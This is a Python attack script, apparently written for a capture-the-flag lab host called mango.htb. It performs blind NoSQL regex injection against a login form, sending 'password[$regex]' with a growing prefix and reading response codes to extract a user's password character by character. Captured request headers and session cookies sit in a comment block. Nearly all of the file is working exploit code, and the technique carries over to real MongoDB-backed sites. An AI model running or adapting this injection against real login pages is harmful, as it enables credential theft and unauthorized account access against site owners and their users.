#!/usr/env/bin python
import requests
from pprint import pprint
'''
cookies = {
	'squirrelmail_language': 'deleted',
	'SQMSESSID': 'r2988l2h6meb7c7nd95u804691',
}

headers = {
	'Connection':'keep-alive',
	'Cache-Control': 'max-age=0',
	'Upgrade-Insecure-Requests': '1',
	...
	'Accept-Language': 'en-US,en ;q=0.9',
}

data = {

	'login_username': 'name',
	'secretkey': 'password',
	'js_autodetect_results': '1',
	'just_logged_in':'1'
	
}


POST / HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://staging-order.mango.htb
Connection: close
Referer: http://staging-order.mango.htb/
Cookie: PHPSESSID=oou47j29tgeliriaqn19iko4or
Upgrade-Insecure-Requests: 1

username=user&password=test&login=login
'''
username = 'abc'

passwords = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#%&\'(),-/:;<=>@[\\]^_`{}~><' #badchar : .$*+?|

def inject(data):
	r = requests.post('http://staging-order.mango.htb/', data=data, allow_redirects=False)
	if r.status_code != 200:
		return True


#TODO look for len first and then make it stop when it is found
secret = ""
while True:
	for i in passwords:
		payload = secret + i
		#print(payload)
		print("\r" + payload, flush=False, end='')
		data = {"username":"mango" , "password[$regex]":"^" + payload, "login":"login" }
		if inject(data):
			secret = secret + i
			break

			
			
exit(0)

for password in passwords:
	cookies = {
		'PHPSESSID':'oou47j29tgeliriaqn19iko4or'
	}

	headers = {
		'Host': 'staging-order.mango.htb',
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '49',
		'Origin': 'http://staging-order.mango.htb',
		'Connection': 'close',
		'Referer': 'http://staging-order.mango.htb/',
		'Upgrade-Insecure-Requests': '1'
	}

	data = {
		#'username[$ne]' : 'user',
		#'username[$regex]' : '^.{5}$',  // see if there is 5 character in this
		#'username[$regex]' : (password + '.{1}'),
		'username' : 'admin',
		'password[$regex]' : '2t*',
		#'password' : password,
		'login' : 'login'
		
	}

	response = requests.post('http://staging-order.mango.htb/', headers=headers, cookies=cookies, data=data) 
	#proxies ( , proxies={'http':'localhost:8080'})
	#not follow redirect (, allow_redirects=False)
	#print(response.status_code)


	if "We rarely look at" in response.text: 
		print('found password', password)
